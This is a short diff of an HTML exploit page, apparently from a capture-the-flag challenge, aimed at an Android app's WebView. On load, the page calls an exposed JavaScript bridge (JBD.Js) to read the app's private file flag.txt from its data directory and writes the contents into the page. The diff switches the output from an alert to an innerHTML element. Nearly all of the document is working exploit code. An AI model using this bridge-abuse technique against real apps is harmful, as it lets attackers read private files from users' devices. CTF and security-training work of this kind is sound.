@@ -1,4 +1,3 @@
-<!-- exploit.html -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,17 +6,19 @@
   <script>
     window.onload = function () {
       const path = "/data/data/com.swdd.eddddge/files/flag.txt";
+      const resultElement = document.getElementById('result');
 
       try {
         const content = JBD.Js(path);
-        alert("FLAG: " + content);
+        resultElement.innerHTML = "FLAG: " + content;
       } catch (e) {
-        document.body.innerText = "Exploit failed: " + e;
+        resultElement.innerHTML = "Exploit failed: " + e;
       }
     };
   </script>
 </head>
 <body>
   <h1>Exploit Running...</h1>
+  <div id="result"></div>
 </body>
 </html>
